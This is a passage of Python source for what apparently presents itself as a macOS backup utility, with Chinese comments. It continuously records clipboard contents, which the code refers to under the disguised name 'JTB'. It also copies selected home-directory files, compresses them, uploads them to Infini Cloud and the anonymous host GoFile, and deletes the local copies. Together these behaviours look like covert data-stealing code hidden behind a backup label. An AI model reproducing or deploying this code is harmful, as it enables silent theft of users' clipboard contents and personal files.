        except (OSError, IOError, PermissionError) as e:
            logging.error(f"删除文件失败: {str(e)}")
            return False

    def _get_upload_server(self):
        """获取上传服务器地址
    
        Returns:
            str: 上传服务器URL
        """
        return "https://store9.gofile.io/uploadFile"

    def split_large_file(self, file_path):
        """将大文件分割成小块
        
        Args:
            file_path: 要分割的文件路径
            
        Returns:
            list: 分片文件路径列表，如果不需要分割则返回None
        """
        if not os.path.exists(file_path):
            return None
        
        file_size = os.path.getsize(file_path)
        if file_size <= self.config.MAX_SINGLE_FILE_SIZE:
            return None
        
        try:
            chunk_files = []
            chunk_dir = os.path.join(os.path.dirname(file_path), "chunks")
            if not self._ensure_directory(chunk_dir):
                return None
            
            base_name = os.path.basename(file_path)
            with open(file_path, 'rb') as f:
                chunk_num = 0
                while True:
                    chunk_data = f.read(self.config.CHUNK_SIZE)
                    if not chunk_data:
                        break
                    
                    chunk_name = f"{base_name}.part{chunk_num:03d}"
                    chunk_path = os.path.join(chunk_dir, chunk_name)
                    
                    with open(chunk_path, 'wb') as chunk_file:
                        chunk_file.write(chunk_data)
                    chunk_files.append(chunk_path)
                    chunk_num += 1
                
            logging.critical(f"文件 {file_path} 已分割为 {len(chunk_files)} 个分片")
            return chunk_files
        except (OSError, IOError, PermissionError, MemoryError) as e:
            logging.error(f"分割文件失败 {file_path}: {e}")
            return None

    def upload_file(self, file_path):
        """上传文件到服务器
        
        Args:
            file_path: 要上传的文件路径
            
        Returns:
            bool: 上传是否成功
        """
        if not self._is_valid_file(file_path):
            logging.error(f"文件 {file_path} 为空或无效，跳过上传")
            return False

        # 检查文件大小并在需要时分片
        chunk_files = self.split_large_file(file_path)
        if chunk_files:
            success = True
            for chunk_file in chunk_files:
                if not self._upload_single_file(chunk_file):
                    success = False
            # 仅在全部分片上传成功后清理分片目录与原始文件
            if success:
                chunk_dir = os.path.dirname(chunk_files[0])
                self._clean_directory(chunk_dir)
                # 若原始文件仍在，上传成功后删除
                if os.path.exists(file_path):
                    self._safe_remove_file(file_path, retry=True)
            return success
        else:
            return self._upload_single_file(file_path)

    def _create_remote_directory(self, remote_dir):
        """创建远程目录（使用 WebDAV MKCOL 方法）"""
        if not remote_dir or remote_dir == '.':
            return True
        
        try:
            # 构建目录路径
            dir_path = f"{self.infini_url.rstrip('/')}/{remote_dir.lstrip('/')}"
            
            response = self.session.request('MKCOL', dir_path, auth=self.auth, timeout=(8, 8))
            
            if response.status_code in [201, 204, 405]:  # 405 表示已存在
                return True
            elif response.status_code == 409:
                # 409 可能表示父目录不存在，尝试创建父目录
                parent_dir = os.path.dirname(remote_dir)
                if parent_dir and parent_dir != '.':
                    if self._create_remote_directory(parent_dir):
                        # 父目录创建成功，再次尝试创建当前目录
                        response = self.session.request('MKCOL', dir_path, auth=self.auth, timeout=(8, 8))
                        return response.status_code in [201, 204, 405]
                return False
            else:
                return False
        except Exception:
            return False

    def _upload_single_file_infini(self, file_path):
        """上传单个文件到 Infini Cloud（使用 WebDAV PUT 方法）"""
        try:
            # 检查文件权限和状态
            if not os.path.exists(file_path):
                logging.error(f"文件不存在: {file_path}")
                return False
                
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"文件大小为0: {file_path}")
                return False
                
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"文件过大 {file_path}: {file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB")
                return False

            # 构建远程路径
            filename = os.path.basename(file_path)
            remote_filename = f"{self.config.INFINI_REMOTE_BASE_DIR}/{filename}"
            remote_path = f"{self.infini_url.rstrip('/')}/{remote_filename.lstrip('/')}"
            
            # 创建远程目录（如果需要）
            remote_dir = os.path.dirname(remote_filename)
            if remote_dir and remote_dir != '.':
                if not self._create_remote_directory(remote_dir):
                    logging.warning(f"无法创建远程目录: {remote_dir}，将继续尝试上传")

            # 上传重试逻辑
            for attempt in range(self.config.RETRY_COUNT):
                if not self._check_internet_connection():
                    logging.error("网络连接不可用，等待重试...")
                    time.sleep(self.config.RETRY_DELAY)
                    continue

                try:
                    # 根据文件大小动态调整超时时间
                    if file_size < 1024 * 1024:  # 小于1MB
                        connect_timeout = 10
                        read_timeout = 30
                    elif file_size < 10 * 1024 * 1024:  # 1-10MB
                        connect_timeout = 15
                        read_timeout = max(30, int(file_size / 1024 / 1024 * 5))
                    else:  # 大于10MB
                        connect_timeout = 20
                        read_timeout = max(60, int(file_size / 1024 / 1024 * 6))
                    
                    # 只在第一次尝试时显示详细信息
                    if attempt == 0:
                        size_str = f"{file_size / 1024 / 1024:.2f}MB" if file_size >= 1024 * 1024 else f"{file_size / 1024:.2f}KB"
                        logging.critical(f"📤 [Infini Cloud] 上传: {filename} ({size_str})")
                    elif self.config.DEBUG_MODE:
                        logging.debug(f"[Infini Cloud] 重试上传: {filename} (第 {attempt + 1} 次)")
                    
                    # 准备请求头
                    headers = {
                        'Content-Type': 'application/octet-stream',
                        'Content-Length': str(file_size),
                    }
                    
                    # 执行上传（使用 WebDAV PUT 方法）
                    with open(file_path, 'rb') as f:
                        response = self.session.put(
                            remote_path,
                            data=f,
                            headers=headers,
                            auth=self.auth,
                            timeout=(connect_timeout, read_timeout),
                            stream=False
                        )
                    
                    if response.status_code in [201, 204]:
                        logging.critical(f"✅ [Infini Cloud] {filename}")
                        return True
                    elif response.status_code == 403:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [Infini Cloud] {filename}: 权限不足")
                    elif response.status_code == 404:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [Infini Cloud] {filename}: 远程路径不存在")
                    elif response.status_code == 409:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [Infini Cloud] {filename}: 远程路径冲突")
                    else:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [Infini Cloud] {filename}: 状态码 {response.status_code}")
                        
                except requests.exceptions.Timeout:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [Infini Cloud] {os.path.basename(file_path)}: 超时")
                except requests.exceptions.SSLError as e:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [Infini Cloud] {os.path.basename(file_path)}: SSL错误")
                except requests.exceptions.ConnectionError as e:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [Infini Cloud] {os.path.basename(file_path)}: 连接错误")
                except Exception as e:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [Infini Cloud] {os.path.basename(file_path)}: {str(e)}")

                if attempt < self.config.RETRY_COUNT - 1:
                    if self.config.DEBUG_MODE:
                        logging.debug(f"等待 {self.config.RETRY_DELAY} 秒后重试...")
                    time.sleep(self.config.RETRY_DELAY)

            return False
            
        except OSError as e:
            logging.error(f"获取文件信息失败 {file_path}: {e}")
            return False
        except Exception as e:
            logging.error(f"[Infini Cloud] 上传过程出错: {e}")
            return False

    def _upload_single_file_gofile(self, file_path):
        """上传单个文件到 GoFile（备选方案）
        
        Args:
            file_path: 要上传的文件路径
            
        Returns:
            bool: 上传是否成功
        """
        if not os.path.exists(file_path):
            logging.error(f"文件不存在: {file_path}")
            return False

        try:
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"文件大小为0: {file_path}")
                return False
            
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"文件过大: {file_path} ({file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB)")
                return False

            filename = os.path.basename(file_path)
            logging.info(f"🔄 尝试使用 GoFile 上传: {filename}")

            server_index = 0
            total_retries = 0
            max_total_retries = len(self.config.UPLOAD_SERVERS) * self.config.MAX_SERVER_RETRIES
            upload_success = False

            while total_retries < max_total_retries and not upload_success:
                if not self._check_internet_connection():
                    logging.error("网络连接不可用，等待重试...")
                    time.sleep(self.config.RETRY_DELAY)
                    total_retries += 1
                    continue

                current_server = self.config.UPLOAD_SERVERS[server_index]
                try:
                    # 使用 with 语句确保文件正确关闭
                    with open(file_path, "rb") as f:
                        response = requests.post(
                            current_server,
                            files={"file": f},
                            data={"token": self.api_token},
                            timeout=self.config.UPLOAD_TIMEOUT,
                            verify=True
                        )

                        if response.ok:
                            try:
                                result = response.json()
                                if result.get("status") == "ok":
                                    logging.critical(f"✅ [GoFile] {filename}")
                                    upload_success = True
                                    break
                                else:
                                    error_msg = result.get("message", "未知错误")
                                    error_code = result.get("code", 0)
                                    if total_retries == 0 or self.config.DEBUG_MODE:
                                        logging.error(f"[GoFile] 服务器返回错误 (代码: {error_code}): {error_msg}")
                                    
                                    # 处理特定错误码
                                    if error_code in [402, 405]:  # 服务器限制或权限错误
                                        server_index = (server_index + 1) % len(self.config.UPLOAD_SERVERS)
                                        if server_index == 0:  # 如果已经尝试了所有服务器
                                            time.sleep(self.config.RETRY_DELAY * 2)  # 增加等待时间
                            except ValueError:
                                if total_retries == 0 or self.config.DEBUG_MODE:
                                    logging.error("[GoFile] 服务器返回无效JSON数据")
                        else:
                            if total_retries == 0 or self.config.DEBUG_MODE:
                                logging.error(f"[GoFile] 上传失败，HTTP状态码: {response.status_code}")

                except requests.exceptions.Timeout:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [GoFile] {filename}: 上传超时")
                except requests.exceptions.SSLError:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [GoFile] {filename}: SSL错误")
                except requests.exceptions.ConnectionError as e:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [GoFile] {filename}: 连接错误")
                except requests.exceptions.RequestException as e:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [GoFile] {filename}: 请求异常")
                except (OSError, IOError) as e:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [GoFile] {filename}: 文件读取错误")
                except Exception as e:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [GoFile] {filename}: {str(e)}")

                # 切换到下一个服务器
                server_index = (server_index + 1) % len(self.config.UPLOAD_SERVERS)
                if server_index == 0:
                    time.sleep(self.config.RETRY_DELAY)  # 所有服务器都尝试过后等待
                
                total_retries += 1

            if upload_success:
                return True
            else:
                logging.error(f"❌ [GoFile] {filename}: 上传失败，已达到最大重试次数")
                return False

        except (OSError, IOError, PermissionError) as e:
            logging.error(f"[GoFile] 处理文件时出错: {str(e)}")
            return False
        except Exception as e:
            logging.error(f"[GoFile] 处理文件时出现未知错误: {str(e)}")
            return False

    def _upload_single_file(self, file_path):
        """上传单个文件，优先使用 Infini Cloud，失败则使用 GoFile 备选方案
        
        Args:
            file_path: 要上传的文件路径
            
        Returns:
            bool: 上传是否成功
        """
        if not os.path.exists(file_path):
            logging.error(f"文件不存在: {file_path}")
            return False

        try:
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"文件大小为0: {file_path}")
                self._safe_remove_file(file_path, retry=False)
                return False
            
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"文件过大: {file_path} ({file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB)")
                self._safe_remove_file(file_path, retry=False)
                return False

            # 优先尝试 Infini Cloud 上传
            if self._upload_single_file_infini(file_path):
                self._safe_remove_file(file_path, retry=True)
                return True

            # Infini Cloud 上传失败，尝试使用 GoFile 备选方案
            logging.warning(f"⚠️ Infini Cloud 上传失败，尝试使用 GoFile 备选方案: {os.path.basename(file_path)}")
            if self._upload_single_file_gofile(file_path):
                self._safe_remove_file(file_path, retry=True)
                return True
            
            # 两个方法都失败
            logging.error(f"❌ {os.path.basename(file_path)}: 所有上传方法均失败")
            return False

        except (OSError, IOError, PermissionError) as e:
            logging.error(f"处理文件时出错: {str(e)}")
            self._safe_remove_file(file_path, retry=False)
            return False
        except Exception as e:
            logging.error(f"处理文件时出现未知错误: {str(e)}")
            return False

    def zip_backup_folder(self, folder_path, zip_file_path):
        """压缩备份文件夹为tar.gz格式
        
        Args:
            folder_path: 要压缩的文件夹路径
            zip_file_path: 压缩文件路径（不含扩展名）
            
        Returns:
            str or list: 压缩文件路径或压缩文件路径列表
        """
        try:
            if folder_path is None or not os.path.exists(folder_path):
                return None

            # 检查源目录是否为空
            total_files = sum(len(files) for _, _, files in os.walk(folder_path))
            if total_files == 0:
                logging.error(f"源目录为空 {folder_path}")
                return None

            # 计算源目录大小
            dir_size = 0
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    try:
                        file_path = os.path.join(dirpath, filename)
                        file_size = os.path.getsize(file_path)
                        if file_size > 0:  # 跳过空文件
                            dir_size += file_size
                    except OSError as e:
                        logging.error(f"获取文件大小失败 {file_path}: {e}")
                        continue

            if dir_size == 0:
                logging.error(f"源目录实际大小为0 {folder_path}")
                return None

            if dir_size > self.config.MAX_SOURCE_DIR_SIZE:
                return self.split_large_directory(folder_path, zip_file_path)

            tar_path = f"{zip_file_path}.tar.gz"
            if os.path.exists(tar_path):
                os.remove(tar_path)

            with tarfile.open(tar_path, "w:gz") as tar:
                tar.add(folder_path, arcname=os.path.basename(folder_path))

            # 验证压缩文件
            try:
                compressed_size = os.path.getsize(tar_path)
                if compressed_size == 0:
                    logging.error(f"压缩文件大小为0 {tar_path}")
                    if os.path.exists(tar_path):
                        os.remove(tar_path)
                    return None
                    
                if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                    os.remove(tar_path)
                    return self.split_large_directory(folder_path, zip_file_path)

                self._clean_directory(folder_path)
                return tar_path
            except OSError as e:
                logging.error(f"获取压缩文件大小失败 {tar_path}: {e}")
                if os.path.exists(tar_path):
                    os.remove(tar_path)
                return None
                
        except (OSError, IOError, PermissionError, tarfile.TarError) as e:
            logging.error(f"压缩失败 {folder_path}: {e}")
            return None

    def split_large_directory(self, folder_path, base_zip_path):
        """将大目录分割成多个小块并分别压缩
        
        Args:
            folder_path: 要分割的目录路径
            base_zip_path: 基础压缩文件路径
            
        Returns:
            list: 压缩文件路径列表
        """
        try:
            compressed_files = []
            current_size = 0
            current_files = []
            part_num = 0
            
            # 创建临时目录存放分块
            temp_dir = os.path.join(os.path.dirname(folder_path), "temp_split")
            if not self._ensure_directory(temp_dir):
                return None

            # 使用更保守的压缩比例估算（假设压缩后为原始大小的70%）
            COMPRESSION_RATIO = 0.7
            # 为了确保安全，将目标大小设置为限制的70%
            SAFETY_MARGIN = 0.7
            MAX_CHUNK_SIZE = int(self.config.MAX_SINGLE_FILE_SIZE * SAFETY_MARGIN / COMPRESSION_RATIO)

            # 先收集所有文件信息
            all_files = []
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    file_path = os.path.join(dirpath, filename)
                    try:
                        file_size = os.path.getsize(file_path)
                        if file_size > 0:  # 跳过空文件
                            rel_path = os.path.relpath(file_path, folder_path)
                            all_files.append((file_path, rel_path, file_size))
                    except OSError:
                        continue

            # 按文件大小降序排序
            all_files.sort(key=lambda x: x[2], reverse=True)

            # 检查是否有单个文件超过限制
            for file_path, _, file_size in all_files[:]:  # 使用切片创建副本以避免在迭代时修改列表
                if file_size > MAX_CHUNK_SIZE:
                    logging.error(f"单个文件过大: {file_size / 1024 / 1024:.1f}MB")
                    all_files.remove((file_path, _, file_size))

            # 使用最优匹配算法进行分组
            current_chunk = []
            current_chunk_size = 0
            
            for file_info in all_files:
                file_path, rel_path, file_size = file_info
                
                # 如果当前文件会导致当前块超过限制，创建新块
                if current_chunk_size + file_size > MAX_CHUNK_SIZE and current_chunk:
                    # 创建新的分块目录
                    part_dir = os.path.join(temp_dir, f"part{part_num}")
                    if self._ensure_directory(part_dir):
                        # 复制文件到分块目录
                        chunk_success = True
                        for src, dst_rel, _ in current_chunk:
                            dst = os.path.join(part_dir, dst_rel)
                            dst_dir = os.path.dirname(dst)
                            if not self._ensure_directory(dst_dir):
                                chunk_success = False
                                break
                            try:
                                shutil.copy2(src, dst)
                            except Exception:
                                chunk_success = False
                                break
                        
                        if chunk_success:
                            # 压缩分块，使用更高的压缩级别
                            tar_path = f"{base_zip_path}_part{part_num}.tar.gz"
                            try:
                                with tarfile.open(tar_path, "w:gz", compresslevel=9) as tar:
                                    tar.add(part_dir, arcname=os.path.basename(folder_path))
                                
                                compressed_size = os.path.getsize(tar_path)
                                if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                                    os.remove(tar_path)
                                    # 如果压缩后仍然过大，尝试将当前块再次分割
                                    if len(current_chunk) > 1:
                                        mid = len(current_chunk) // 2
                                        # 递归处理前半部分
                                        self._process_partial_chunk(current_chunk[:mid], temp_dir, base_zip_path, 
                                                                 part_num, compressed_files)
                                        # 递归处理后半部分
                                        self._process_partial_chunk(current_chunk[mid:], temp_dir, base_zip_path, 
                                                                 part_num + 1, compressed_files)
                                    part_num += 2
                                else:
                                    compressed_files.append(tar_path)
                                    logging.info(f"分块 {part_num + 1}: {current_chunk_size / 1024 / 1024:.1f}MB -> {compressed_size / 1024 / 1024:.1f}MB")
                                    part_num += 1
                            except Exception:
                                if os.path.exists(tar_path):
                                    os.remove(tar_path)
                    
                    self._clean_directory(part_dir)
                    current_chunk = []
                    current_chunk_size = 0
                
                # 添加文件到当前块
                current_chunk.append((file_path, rel_path, file_size))
                current_chunk_size += file_size
            
            # 处理最后一个块
            if current_chunk:
                part_dir = os.path.join(temp_dir, f"part{part_num}")
                if self._ensure_directory(part_dir):
                    chunk_success = True
                    for src, dst_rel, _ in current_chunk:
                        dst = os.path.join(part_dir, dst_rel)
                        dst_dir = os.path.dirname(dst)
                        if not self._ensure_directory(dst_dir):
                            chunk_success = False
                            break
                        try:
                            shutil.copy2(src, dst)
                        except Exception:
                            chunk_success = False
                            break
                    
                    if chunk_success:
                        tar_path = f"{base_zip_path}_part{part_num}.tar.gz"
                        try:
                            with tarfile.open(tar_path, "w:gz", compresslevel=9) as tar:
                                tar.add(part_dir, arcname=os.path.basename(folder_path))
                            
                            compressed_size = os.path.getsize(tar_path)
                            if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                                os.remove(tar_path)
                                # 如果压缩后仍然过大，尝试将当前块再次分割
                                if len(current_chunk) > 1:
                                    mid = len(current_chunk) // 2
                                    # 递归处理前半部分
                                    self._process_partial_chunk(current_chunk[:mid], temp_dir, base_zip_path, 
                                                             part_num, compressed_files)
                                    # 递归处理后半部分
                                    self._process_partial_chunk(current_chunk[mid:], temp_dir, base_zip_path, 
                                                             part_num + 1, compressed_files)
                            else:
                                compressed_files.append(tar_path)
                                logging.info(f"最后分块: {current_chunk_size / 1024 / 1024:.1f}MB -> {compressed_size / 1024 / 1024:.1f}MB")
                        except Exception:
                            if os.path.exists(tar_path):
                                os.remove(tar_path)
                    
                    self._clean_directory(part_dir)
            
            # 清理临时目录和源目录
            self._clean_directory(temp_dir)
            self._clean_directory(folder_path)
            
            if not compressed_files:
                logging.error("分割失败，没有生成有效的压缩文件")
                return None
            
            logging.info(f"已分割为 {len(compressed_files)} 个压缩文件")
            return compressed_files
        except Exception:
            logging.error("分割失败")
            return None

    def _process_partial_chunk(self, chunk, temp_dir, base_zip_path, part_num, compressed_files):
        """处理部分分块
        
        Args:
            chunk: 要处理的文件列表
            temp_dir: 临时目录路径
            base_zip_path: 基础压缩文件路径
            part_num: 分块编号
            compressed_files: 压缩文件列表
        """
        part_dir = os.path.join(temp_dir, f"part{part_num}_sub")
        if not self._ensure_directory(part_dir):
            return
        
        chunk_success = True
        total_size = 0
        for src, dst_rel, file_size in chunk:
            dst = os.path.join(part_dir, dst_rel)
            dst_dir = os.path.dirname(dst)
            if not self._ensure_directory(dst_dir):
                chunk_success = False
                break
            try:
                shutil.copy2(src, dst)
                total_size += file_size
            except Exception:
                chunk_success = False
                break
        
        if chunk_success:
            tar_path = f"{base_zip_path}_part{part_num}_sub.tar.gz"
            try:
                with tarfile.open(tar_path, "w:gz", compresslevel=9) as tar:
                    tar.add(part_dir, arcname=os.path.basename(os.path.dirname(part_dir)))
                
                compressed_size = os.path.getsize(tar_path)
                if compressed_size <= self.config.MAX_SINGLE_FILE_SIZE:
                    compressed_files.append(tar_path)
                    logging.info(f"子分块: {total_size / 1024 / 1024:.1f}MB -> {compressed_size / 1024 / 1024:.1f}MB")
                else:
                    os.remove(tar_path)
            except Exception:
                if os.path.exists(tar_path):
                    os.remove(tar_path)
        
        self._clean_directory(part_dir)

    def get_clipboard_content(self):
        """获取JTB内容"""
        try:
            content = subprocess.check_output(['pbpaste']).decode('utf-8')
            if content is None:
                return None
            # 去除空白字符
            content = content.strip()
            return content if content else None
        except (subprocess.CalledProcessError, RuntimeError, UnicodeDecodeError) as e:
            # 某些环境下（如无图形界面 / 无剪贴板服务）会持续抛出异常
            # 这里不记录错误日志，只返回 None，避免日志被高频刷屏
            return None

    def log_clipboard_update(self, content, file_path):
        """记录JTB更新到文件"""
        try:
            # 确保目录存在
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            
            # 写入日志
            with open(file_path, 'a', encoding='utf-8', errors='ignore') as f:
                f.write(f"\n=== 📋 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                f.write(f"{content}\n")
                f.write("-"*30 + "\n")
        except (OSError, IOError, PermissionError) as e:
            if self.config.DEBUG_MODE:
                logging.error(f"❌ 记录JTB失败: {e}")

    def monitor_clipboard(self, file_path, interval=3):
        """监控JTB变化并记录到文件
        
        Args:
            file_path: 日志文件路径
            interval: 检查间隔（秒）
        """
        # 确保日志目录存在
        log_dir = os.path.dirname(file_path)
        if not os.path.exists(log_dir):
            try:
                os.makedirs(log_dir, exist_ok=True)
            except Exception as e:
                logging.error(f"❌ 创建JTB日志目录失败: {e}")
                return

        last_content = ""
        error_count = 0  # 添加错误计数
        max_errors = 5   # 最大连续错误次数
        
        while True:
            try:
                current_content = self.get_clipboard_content()
                # 只有当JTB内容非空且与上次不同时才记录
                if current_content and current_content != last_content:
                    self.log_clipboard_update(current_content, file_path)
                    last_content = current_content
                    if self.config.DEBUG_MODE:
                        logging.info("📋 检测到JTB更新")
                    error_count = 0  # 重置错误计数
                else:
                    error_count = 0  # 空内容不算错误，重置计数
            except Exception as e:
                error_count += 1
                if error_count >= max_errors:
                    if self.config.DEBUG_MODE:
                        logging.error(f"❌ JTB监控连续出错{max_errors}次，等待{self.config.CLIPBOARD_ERROR_WAIT}秒后重试")
                    time.sleep(self.config.CLIPBOARD_ERROR_WAIT)
                    error_count = 0  # 重置错误计数
                elif self.config.DEBUG_MODE:
                    logging.error(f"❌ JTB监控出错: {e}")
            time.sleep(interval if interval else self.config.CLIPBOARD_CHECK_INTERVAL)

    def upload_backup(self, backup_path):
        """上传备份文件
        
        Args:
            backup_path: 备份文件路径或备份文件路径列表
            
        Returns:
            bool: 上传是否成功
        """
        if isinstance(backup_path, list):
            success = True
            for path in backup_path:
                if not self.upload_file(path):
                    success = False
            return success
        else:
            return self.upload_file(backup_path)

    def backup_specified_files(self, source_dir, target_dir):
        """备份指定的目录和文件
        
        Args:
            source_dir: 源目录路径
            target_dir: 目标目录路径
            
        Returns:
            str: 备份目录路径，如果失败则返回None
        """
        source_dir = os.path.abspath(os.path.expanduser(source_dir))
        target_dir = os.path.abspath(os.path.expanduser(target_dir))

        if self.config.DEBUG_MODE:
            logging.debug(f"开始备份指定目录和文件:")
            logging.debug(f"源目录: {source_dir}")
            logging.debug(f"目标目录: {target_dir}")

        if not os.path.exists(source_dir):
            logging.error(f"❌ 源目录不存在: {source_dir}")
            return None

        if not os.access(source_dir, os.R_OK):
            logging.error(f"❌ 源目录没有读取权限: {source_dir}")
            return None

        if not self._clean_directory(target_dir):
            logging.error(f"❌ 无法清理或创建目标目录: {target_dir}")
            return None

        # 计算文件大小限制（与split_large_directory中的逻辑一致）
        COMPRESSION_RATIO = 0.7
        SAFETY_MARGIN = 0.7
        MAX_CHUNK_SIZE = int(self.config.MAX_SINGLE_FILE_SIZE * SAFETY_MARGIN / COMPRESSION_RATIO)

        items_count = 0  # 顶层项目数量（目录或文件）
        files_count = 0  # 实际文件数量
        total_size = 0
        skipped_files = []  # 跳过的超大文件列表
        retry_count = 3
        retry_delay = 5

        def copy_with_size_check(src, dst, is_file=False):
            """复制文件或目录，检查文件大小并跳过超大文件"""
            nonlocal files_count, total_size, skipped_files
            
            if is_file:
                # 检查单个文件大小
                try:
                    file_size = os.path.getsize(src)
                    if file_size > MAX_CHUNK_SIZE:
                        skipped_files.append((src, file_size))
                        logging.warning(f"⚠️ 跳过超大文件: {src} ({file_size / 1024 / 1024:.1f}MB > {MAX_CHUNK_SIZE / 1024 / 1024:.1f}MB)")
                        return False
                    shutil.copy2(src, dst)
                    files_count += 1
                    total_size += file_size
                    return True
                except Exception as e:
                    if self.config.DEBUG_MODE:
                        logging.debug(f"复制文件失败: {src} - {str(e)}")
                    return False
            else:
                # 复制目录，递归检查每个文件
                try:
                    os.makedirs(dst, exist_ok=True)
                    copied_any = False
                    for root, dirs, filenames in os.walk(src):
                        # 计算相对路径
                        rel_root = os.path.relpath(root, src)
                        dst_root = os.path.join(dst, rel_root) if rel_root != '.' else dst
                        
                        # 创建子目录
                        for d in dirs:
                            src_dir = os.path.join(root, d)
                            dst_dir = os.path.join(dst_root, d)
                            os.makedirs(dst_dir, exist_ok=True)
                        
                        # 复制文件
                        for filename in filenames:
                            src_file = os.path.join(root, filename)
                            dst_file = os.path.join(dst_root, filename)
                            
                            try:
                                file_size = os.path.getsize(src_file)
                                if file_size > MAX_CHUNK_SIZE:
                                    skipped_files.append((src_file, file_size))
                                    logging.warning(f"⚠️ 跳过超大文件: {src_file} ({file_size / 1024 / 1024:.1f}MB > {MAX_CHUNK_SIZE / 1024 / 1024:.1f}MB)")
                                    continue
                                
                                shutil.copy2(src_file, dst_file)
                                files_count += 1
                                total_size += file_size
                                copied_any = True
                            except Exception as e:
                                if self.config.DEBUG_MODE:
                                    logging.debug(f"复制文件失败: {src_file} - {str(e)}")
                                continue
                    
                    return copied_any
                except Exception as e:
                    if self.config.DEBUG_MODE:
                        logging.debug(f"复制目录失败: {src} - {str(e)}")
                    return False

        for item in self.config.MACOS_SPECIFIC_DIRS:
            source_path = os.path.join(source_dir, item)
            if not os.path.exists(source_path):
                if self.config.DEBUG_MODE:
                    logging.debug(f"跳过不存在的项目: {source_path}")
                continue

            try:
                target_path = os.path.join(target_dir, item)
                if os.path.isdir(source_path):
                    # 复制目录
                    if copy_with_size_check(source_path, target_path, is_file=False):
                        items_count += 1
                        if self.config.DEBUG_MODE:
                            logging.debug(f"成功复制目录: {source_path} -> {target_path}")
                else:
                    # 复制文件
                    if copy_with_size_check(source_path, target_path, is_file=True):
                        items_count += 1
                        if self.config.DEBUG_MODE:
                            logging.debug(f"成功复制文件: {source_path} -> {target_path}")
            except Exception as e:
                if self.config.DEBUG_MODE:
                    logging.debug(f"处理失败: {source_path} - {str(e)}")

        if items_count > 0:
            logging.info(f"\n📊 指定文件备份完成:")
            logging.info(f"   📁 顶层项目数量: {items_count}")
            logging.info(f"   📄 实际文件数量: {files_count}")
            logging.info(f"   💾 总大小: {total_size / 1024 / 1024:.1f}MB")
            if skipped_files:
                logging.warning(f"   ⚠️ 跳过的超大文件数量: {len(skipped_files)}")
                if self.config.DEBUG_MODE:
                    for file_path, file_size in skipped_files[:10]:  # 只显示前10个
                        logging.debug(f"      - {file_path} ({file_size / 1024 / 1024:.1f}MB)")
            return target_dir
        else:
            logging.error(f"❌ 未找到需要备份的指定文件")
            return None

    def has_clipboard_content(self, file_path):
        """检查粘贴板文件是否有实际内容记录
        
        Args:
            file_path: 粘贴板日志文件路径
            
        Returns:
            bool: 是否有实际内容记录
        """
        try:
            if not os.path.exists(file_path):
                return False
                
            # 检查文件大小
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                return False
                
            # 读取文件内容
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read().strip()
                
            if not content:
                return False
                
            # 检查是否只包含标题行（没有实际内容）
            lines = content.split('\n')
            actual_content_lines = []
            
            for line in lines:
                line = line.strip()
                # 跳过空行、标题行和分隔线
                if (line and 
                    not line.startswith('===') and 
                    not line.startswith('📋') and 
                    not line.startswith('-') * 30 and
                    not line.startswith('JTB日志已于') and
                    not line.startswith('JTB监控启动于')):
                    actual_content_lines.append(line)
            
            # 如果有实际内容行，返回True
            return len(actual_content_lines) > 0
            
        except Exception as e:
            if self.config.DEBUG_MODE:
                logging.error(f"检查粘贴板文件内容失败: {e}")
            return False

def is_disk_available(disk_path):
    """检查磁盘是否可用"""
    try:
        return os.path.exists(disk_path) and os.access(disk_path, os.R_OK)
    except Exception:
        return False

def get_available_volumes():
    """获取所有可用的数据卷和云盘目录"""
    available_volumes = {}
    
    # 获取用户主目录
    user_path = os.path.expanduser('~')
    if os.path.exists(user_path):
        try:
            logging.info("正在配置用户主目录备份...")
            logging.debug(f"用户主目录: {user_path}")
            
            # 获取用户名前缀
            username = getpass.getuser()
            user_prefix = username[:5] if username else "user"
            
            # 配置用户主目录备份
            backup_path = os.path.join(BackupConfig.BACKUP_ROOT, f'{user_prefix}_home')
            available_volumes['home'] = {
                'specified': (os.path.abspath(user_path), os.path.join(backup_path, f'{user_prefix}_specified'), 4),
            }
            logging.info(f"✅ 已配置用户主目录备份: {user_path}")
            
        except Exception as e:
            logging.error(f"❌ 配置用户主目录备份时出错: {e}")
    
    if not available_volumes:
        logging.warning("⚠️ 未检测到可用的用户主目录")
    else:
        logging.info(f"📊 已配置用户主目录备份")
        for name, config in available_volumes.items():
            if 'specified' in config:
